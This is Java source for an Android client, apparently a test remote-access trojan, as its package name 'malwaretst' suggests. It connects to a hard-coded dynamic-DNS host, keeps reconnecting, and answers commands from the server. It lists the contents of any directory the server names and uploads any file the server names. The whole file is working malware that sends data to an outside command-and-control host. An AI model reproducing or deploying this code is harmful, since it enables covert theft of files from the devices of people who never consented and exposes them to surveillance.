package com.peticali.malwaretst;


import android.util.Log;


import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

import java.net.ConnectException;

import java.net.Socket;

import java.net.SocketException;
import java.net.UnknownHostException;

public class client {

    public static void main() throws IOException, InterruptedException {


        String Received;
        String data;

        Log.v("CLIENT","initialized");



        try {
            Socket socket = new Socket("updatesisraelschoba.ignorelist.com", 55641);



        OutputStream outputStream = socket.getOutputStream();
        DataOutputStream dataOutputStream = new DataOutputStream(outputStream);


        InputStream inputStream = socket.getInputStream();
        final DataInputStream dataInputStream = new DataInputStream(inputStream);




        while (true){
            Received = "";
            try{
                Received = dataInputStream.readUTF();
            } catch (SocketException ex){
                Log.v("CLIENT","EEEEERRRRRROOOO");
                Thread.sleep(4000);
                client.main();



            }


            Log.v("CLIENT","Server received" + Received);

            if (Received.equals("ping")){

                dataOutputStream.writeUTF("PONG");
                dataOutputStream.flush(); // send the message
                Log.v("CLIENT","sent ping");



            }

            if(Received.equals("getfile")){
                Log.v("CLIENT","Server request file");

                String path = dataInputStream.readUTF();

                Log.v("CLIENT","Server request file2" + path);


                File f = new File(path);
                File[] files = f.listFiles();

                String Files = "";

                try {
                    for (File inFile : files) {

                        Log.v("CLIENT", inFile.getName());

                        dataOutputStream.writeUTF(inFile.getName());
                        dataOutputStream.flush();

                    }
                }catch (NullPointerException e){
                    Log.v("CLIENT","ISSO Ãˆ UM FILE NAO FOLDER");
                }

                dataOutputStream.writeUTF("/getfile>");
                dataOutputStream.flush();

            }
            if(Received.equals("downloadfile")){


                String path = dataInputStream.readUTF(); //pega o arquivo que o servidor mandou

                try{
                FileInputStream fis = new FileInputStream(path); //manda o arquivo pro FileInputStream

                long size = fis.getChannel().size();//pega tamanho do arquivo

                dataOutputStream.writeLong(size);// manda pro servidor o tamanho do arquivo

                Log.v("CLIENT","SIZEFILE = " + String.valueOf(size));


                byte[] buffer = new byte[4096]; //buffer de 4096 bytes

                int count=0;

                while ((count = fis.read(buffer)) > 0)
                {
                    dataOutputStream.write(buffer, 0, count);
                }

                fis.close();


            }catch (FileNotFoundException e) {
                Log.v("CLIENT","NOTFOUND");}
            }


        }
        } catch (ConnectException | UnknownHostException e){
            Thread.sleep(4000);
            //e.printStackTrace();
            Log.v("CLIENT","aaaAAAAAAAAAAAAAAAAAAA");
            client.main();


        }


        // write the message we want to send



    }

}
